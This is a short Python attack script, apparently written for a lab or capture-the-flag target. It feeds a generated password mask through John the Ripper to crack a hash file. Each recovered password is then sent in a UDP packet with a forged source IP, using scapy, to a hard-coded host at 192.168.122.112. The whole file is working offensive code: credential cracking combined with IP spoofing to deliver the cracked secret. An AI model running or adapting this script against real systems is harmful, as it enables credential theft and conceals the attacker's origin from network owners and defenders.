#! /usr/bin/env python
#coding: utf-8

import os
import sys
from scapy.all import *
from netfilterqueue import NetfilterQueue
import logging
from subprocess import *
import multiprocessing
import time

def print_red(prt): print("\033[91m {}\033[00m" .format(prt))
def print_green(prt): print("\033[92m {}\033[00m" .format(prt))

host = "192.168.122.112"
global john
def crack_proc(spoofed):
    p = subprocess.Popen("mp64 -i 9:11 'hashfile?d?d?d' | rev | ./JohnTheRipper/run/john -pipe hashes -pot=hashes.pot", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print(p.stdout.readline().decode())
    stdout = []
    while True:
        line = p.stdout.readline().decode()
        stdout.append(line)
        if "(?)" in line:

            passwd  = line.split(" ")[0]
            print("[*] password found : " + passwd)
            send(IP(src=spoofed,dst=host)/UDP(sport=12345,dport=3333)/Raw(load="{}:{}".format(passwd[::-1],passwd)))
            #send(IP(src=spoofed,dst=host)/UDP(sport=12345,dport=3333)/Raw(load="{}:{}".format("toto",passwd)))
        else:
            print(line)
        if line == '' and p.poll() != None:
            break

def main():
    try:
        spoofedip = sys.argv[1]
        print("[*] Launch a new cracking process, result will be send with spoofedip: " + spoofedip + " ...")
        john = multiprocessing.Process(target=crack_proc, args=(spoofedip,))
        john.start()
    except KeyboardInterrupt:
        john.terminate()
        print("[*] JOHN IS DEAD! RIP...")
        pass

if __name__ == "__main__":
    main()
